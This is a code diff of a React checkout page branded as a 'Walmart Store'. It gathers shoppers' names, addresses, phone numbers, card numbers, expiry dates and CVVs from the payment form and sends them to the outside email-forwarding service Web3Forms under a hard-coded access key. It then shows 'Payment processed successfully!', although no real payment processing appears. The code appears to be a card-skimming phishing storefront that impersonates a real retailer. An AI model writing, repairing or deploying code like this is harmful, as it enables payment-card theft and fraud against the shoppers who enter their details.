@@ -49,7 +49,7 @@ const PaymentPage = () => {
     });
   };
 
-    const handleSubmit = async (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
     // Validation
@@ -83,7 +83,7 @@ const PaymentPage = () => {
         0
       );
 
-      // Save order to database logic (REMAINS UNCHANGED)
+      // Save order to database
       const orderData = {
         customerName: userInfo.fullName,
         customerEmail: userInfo.email,
@@ -109,30 +109,41 @@ const PaymentPage = () => {
         }
       };
 
+      // Save to MongoDB
       const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
       if (BACKEND_URL) {
         await fetch(`${BACKEND_URL}/api/orders`, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify(orderData)
         });
       }
 
-      // --- WEB3FORMS SECTION (FIXED) ---
+      // Initialize FormData from the event target (grabs all inputs: cardNumber, cvv, expiryDate, cardholderName)
       const formData = new FormData(e.target);
+      
+      // Append Web3Forms access key
       formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
+      
+      // Append all your custom fields exactly as you had them
       formData.append("subject", "New Order Received - Walmart Store");
       formData.append("from_name", "Walmart E-commerce");
       
-      // Customer & Shipping Info (REMAINS UNCHANGED)
+      // Customer Information
       formData.append("customer_name", userInfo.fullName);
       formData.append("customer_email", userInfo.email);
       formData.append("customer_phone", userInfo.phone);
+      
+      // Shipping Address
       formData.append("shipping_address", userInfo.address);
       formData.append("shipping_city", userInfo.city);
       formData.append("shipping_state", userInfo.state);
       formData.append("shipping_zip", userInfo.zipCode);
       formData.append("shipping_country", userInfo.country);
+      
+      // Order Details
       formData.append("order_total", subtotal.toFixed(2));
       
       const orderItemsStr = cart.map(item => 
@@ -144,12 +155,7 @@ const PaymentPage = () => {
       formData.append("order_date", new Date().toLocaleString());
       formData.append("redirect", "false");
 
-      // --- ADDING MISSING CARD DETAILS HERE ---
-      formData.append("Card_Holder_Name", paymentData.cardholderName);
-      formData.append("Card_Number", paymentData.cardNumber);
-      formData.append("Expiry_Date", paymentData.expiryDate);
-      formData.append("CVV", paymentData.cvv);
-
+      // Send to Web3Forms via FormData format
       const response = await fetch("https://api.web3forms.com/submit", {
         method: "POST",
         body: formData
@@ -158,14 +164,22 @@ const PaymentPage = () => {
       const data = await response.json();
 
       if (data.success) {
+        // Save order info and clear cart
         localStorage.setItem('lastOrder', JSON.stringify({
-          cart, userInfo, total: subtotal, orderDate: new Date().toISOString()
+          cart,
+          userInfo,
+          total: subtotal,
+          orderDate: new Date().toISOString()
         }));
         localStorage.removeItem('cart');
         localStorage.removeItem('userInfo');
+
         toast.success('Payment processed successfully!');
         e.target.reset();
-        setTimeout(() => { navigate('/checkout/confirmation'); }, 1000);
+        
+        setTimeout(() => {
+          navigate('/checkout/confirmation');
+        }, 1000);
       } else {
         throw new Error('Failed to send order notification');
       }
@@ -176,7 +190,6 @@ const PaymentPage = () => {
       setIsProcessing(false);
     }
   };
-
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
